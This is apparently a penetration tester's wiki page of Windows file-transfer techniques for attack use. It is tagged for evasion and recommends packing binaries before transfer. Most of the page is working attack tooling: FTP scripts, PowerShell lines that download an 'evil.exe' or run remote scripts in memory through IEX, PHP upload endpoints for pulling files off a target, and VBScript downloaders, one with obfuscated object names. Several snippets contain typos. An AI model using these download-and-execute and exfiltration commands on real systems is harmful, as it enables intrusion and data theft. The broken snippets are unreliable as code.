---
title: File Transfer
date: M01-28-2023
author: i4
---
#evasion 

- Use [UPX Packer](/wiki/Security/Tools/UPX%20Packer.md) and or [Exe2Hex](/wiki/Security/Tools/Exe2Hex.md) before transferring data
## FTP
```cmd
C:\> ftp -h

Transfers files to and from a computer running an FTP server service
(sometimes called a daemon). Ftp can be used interactively.

FTP [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-A] [-x:sendbuffer] [-r:recvbuffer] [-b:asyncbuffers] [-w:windowsize] [host]

  -v              Suppresses display of remote server responses.
  -n              Suppresses auto-login upon initial connection.
  -i              Turns off interactive prompting during multiple file
                  transfers.
  -d              Enables debugging.
  -g              Disables filename globbing (see GLOB command).
  -s:filename     Specifies a text file containing FTP commands; the
                  commands will automatically run after FTP starts.
  -a              Use any local interface when binding data connection.
  -A              login as anonymous.
  -x:send sockbuf Overrides the default SO_SNDBUF size of 8192.
  -r:recv sockbuf Overrides the default SO_RCVBUF size of 8192.
  -b:async count  Overrides the default async count of 3
  -w:windowsize   Overrides the default transfer buffer size of 65535.
  host            Specifies the host name or IP address of the remote
                  host to connect to.

Notes:
  - mget and mput commands take y/n/q for yes/no/quit.
  - Use Control-C to abort commands.
```

**Using non-interactive FTP**
```cmd
> echo open [ip] 21 > ftp.txt
> echo USER [user] >> ftp.txt
> echo [password] >> ftp.txt
> echo bin >> ft.txt
> echo GET [file] >> ftp.txt
> echo bye >> ftp.txt 
```

Start with: `> ftp -v -n -s:ftp.txt`


## Scripting Languages
### Powershell
- `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
```powershell
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://[IP]/[file]" >>wget.ps1
echo $file = "[dstfile]" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

#### With a PHP Server

##### Server
```php
<?php
	$uplaoddir = '/var/www/uploads';
	$uploadfile = $uploaddir . $_FILES['file']['name'];

	move_uploaded_file($_Files['file']['tmp_name'], $uploadfile)
?>
```
or

- Allows the use of `Invoke-WebRequest` / `Invoke-RestMethod`
```php
<?php
	$file = file_get_contents("php://input");
	file_put_contents("uploads/upload.txt", $file);
?>
```
##### Client
```powershell
(New-Object System.Net.WebClient).UploadFile('http://[ip]/upload.php', '[file]')
```
or (with the second php script)
```powershell
invoke-restmethod -uri http://[ip]/upload.php -method post -infile [file]
```

**Other Methods**
- `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')`
- `Invoke-WebRequest -Url http://[IP]/[file] [dstFile]`
- File to base64 string `[convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))` 
	- Decode on target system with `echo "[base64 string]" | base64 -d > output.txt`
`

To execute a download without saving it to disk use `IEX (Invoke-Expressions)`
```
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://[URL]/file.ps1')
```
### VBScript

#### Method 1
- `csript wget.vbs http://[IP]/[file] [dstFile]`
- `wscript wget.vbs http://[IP]/[file] [dstFile`

```vbscript
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```

Full file:
```vbscript
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1)
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
Const HTTPREQUEST_PROXYSETTING_PROXY = 2
Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts
 Err.Clear
 Set http = Nothing
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
 If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
 If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
 http.Open "GET", strURL, False
 http.Send
 varByteArray = http.ResponseBody
 Set http = Nothing
 Set fs = CreateObject("Scripting.FileSystemObject")
 Set ts = fs.CreateTextFile(StrFile, True)
 strData = ""
 strBuffer = ""
 For lngCounter = 0 to UBound(varByteArray)
 ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))
 Next
 ts.Close
```



#### Method 2

- `wscript.exe download.vbs http://[ip]/file [destination]`
```vbscript
Dim x,x1,x2,x3,s,s1,s2>wget.vbs
x1 = "MSXML2.">>wget.vbs
x2 = "Server">>wget.vbs
x3 = "XMLHTTP">>wget.vbs
s1 = "ADODB.">>wget.vbs
s2 = "Stream">>wget.vbs
Set x = CreateObject(x1 & x2 & x3)>>wget.vbs
x.Open "GET", WScript.Arguments.Item(0), False>>wget.vbs
x.Send>>wget.vbs
Set s = CreateObject(s1 & s2)>>wget.vbs
s.Open>>wget.vbs
s.Type = 1>>wget.vbs
s.Write x.ResponseBody>>wget.vbs
s.SaveToFile WScript.Arguments.Item(1), 2>>wget.vbs
s.Close>>wget.vbs
```

